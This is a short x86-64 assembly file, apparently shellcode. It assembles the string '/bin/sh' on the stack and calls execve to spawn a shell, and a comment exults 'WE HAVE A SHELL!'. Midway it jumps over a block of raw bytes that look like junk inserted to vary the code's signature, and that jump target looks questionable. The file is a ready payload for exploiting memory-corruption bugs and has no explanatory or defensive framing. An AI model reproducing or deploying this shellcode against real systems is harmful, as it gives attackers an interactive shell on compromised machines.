[SECTION .text]

global _start

align 4096
_start:
	xor rax, rax
	xor rdx, rdx
	mov bx, 0x6873 		; hs
	shl rbx, 16 		; make some space on the register
	mov bx, 0x2f6e	 	; /n
	shl rbx, 16
	mov bx, 0x6962 		; ib
	shl rbx, 8
	mov bl, 0x2f 		; /bin/sh
	push rbx
	
	jmp short 10
	db 0x57,0x48,0xc1,0xe3,0x2f,0x53,0x2f,0x48,0xb8
	
	push rdx 			; To the stack argv
	lea rdi, [rsp + 8] 	; set argv[0] /bin/sh
	push rdi 			; Shell to the stack
	mov rsi, rsp 		; 1st parameter points to the Stack (mem loc)
	mov al, 59 			; execve is syscall 59
	syscall 			; call the kernel, WE HAVE A SHELL!
	xor rax, rax
	mov al, 60 			; Exit
	xor rdi, rdi 		; Exit code
	syscall